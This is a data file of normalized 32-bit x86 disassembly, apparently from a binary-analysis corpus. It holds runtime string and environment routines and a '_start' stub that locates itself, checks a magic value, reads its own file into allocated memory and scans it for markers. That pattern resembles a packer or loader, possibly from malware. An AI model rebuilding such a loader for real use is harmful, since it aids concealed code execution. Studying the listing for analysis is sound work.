lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x14 ] ebx
mov [ eax ] edi
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
cmp esi ecx
mov [ ebp - 0x10 ] edx
jb r-xdata
inc [ eax + 0x8 ]
test esi esi
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
test ebx ebx
mov [ eax + 0x4 ] esi
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
test edx edx
mov [ eax + 0x4 ] ecx
je r-xdata
sub_4206c0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_420721
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add [ ebp + 0x10 ] eax
inc eax
cmp ecx edi
jne r-xdata
mov [ rw-data ] 0x2
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
mov ecx edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
or eax 0xffffffff
sub eax ecx
add edx eax
mov [ ebp + 0x18 ] edx
jmp r-xdata
inc eax
cmp ecx edi
jne r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_41e0a8
mov esi eax
cmp esi 0xffffffff
pop ecx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
cmp [ ebp + 0x1c ] edi
mov [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
test ebx ebx
mov esi eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_41e0ef
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_40fdab
push edi
call sub_40fdab
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_41e0ef
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
cmp ebx edi
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_40fdab
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
test ebx ebx
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_40e632
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_40fe88
test eax eax
pop ecx
je r-xdata
call sub_413980
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_40e632
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_40fe88
test eax eax
pop ecx
je r-xdata
call sub_413980
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_420aaa
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_420721
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_420aea
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_420aaa
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42026c
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_412089
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_420be2
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ esp + 0x10 ]
call sub_420448
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
pop esi
sar eax 0x2
neg eax
retn
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
pop esi
sar eax 0x2
retn
test al al
je r-xdata
sub_420c2f
push ebp
mov ebp esp
push ecx
xor eax eax
test edi edi
mov ecx edi
jne r-xdata
cmp [ edi ] eax
je r-xdata
leave
retn
push ebx
push esi
inc eax
push 0x4
push eax
call sub_413797
mov esi eax
test esi esi
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx edi
jmp r-xdata
push 0x9
call sub_40e060
pop ecx
test eax eax
jne r-xdata
push eax
call sub_420ed3
mov [ esi ] eax
add esi 0x4
add ebx 0x4
mov eax [ ebx ]
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn
sub_420c8c
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp eax ebx
push edi
mov [ ebp - 0x10 ] ebx
jne r-xdata
push esi
mov esi [ eax ]
cmp esi ebx
mov [ ebp - 0x4 ] esi
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_412089
mov [ eax ] 0x16
push 0x3d
push esi
call sub_420fdd
cmp eax ebx
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
je r-xdata
pop edi
pop ebx
leave
retn
cmp esi eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x1 ] bl
mov eax [ rw-data ]
sete cl
cmp eax [ rw-data ]
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp eax ebx
jne r-xdata
mov edi eax
call sub_420c2f
mov [ rw-data ] eax
mov esi [ rw-data ]
cmp esi ebx
mov [ ebp - 0x14 ] esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
mov edi [ ebp - 0xc ]
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_420be2
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_413757
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_42045f
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40fdab
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_40fdab
cmp [ ebp - 0x8 ] ebx
pop ecx
jne r-xdata
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_413757
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x14 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_41382a
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_41382a
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_415b90
inc eax
pop ecx
inc eax
push eax
call sub_413797
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_40fdab
pop ecx
push esi
push esi
call sub_415b90
inc eax
pop ecx
inc eax
push eax
push edi
call sub_415600
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0xc ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
push edi
call sub_40fdab
pop ecx
or [ ebp - 0x10 ] 0xffffffff
call sub_412089
mov [ eax ] 0x2a
sub_420ed3
push ebx
mov ebx [ esp + 0x8 ]
push ebp
xor ebp ebp
cmp ebx ebp
jne r-xdata
push esi
push edi
push ebx
call sub_415b90
mov esi eax
inc esi
push esi
call sub_40fe88
mov edi eax
cmp edi ebp
pop ecx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push ebx
push esi
push edi
call sub_415600
add esp 0xc
test eax eax
je r-xdata
pop ebp
pop ebx
retn
mov eax edi
jmp r-xdata
push ebp
push ebp
push ebp
push ebp
push ebp
call sub_411f2e
add esp 0x14
pop edi
pop esi
sub_420f23
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_418000
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_44927d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_449f70
add esp 0x4
call sub_44a130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_44a160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_44a160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_449f70
add esp 0x4
push 0x104
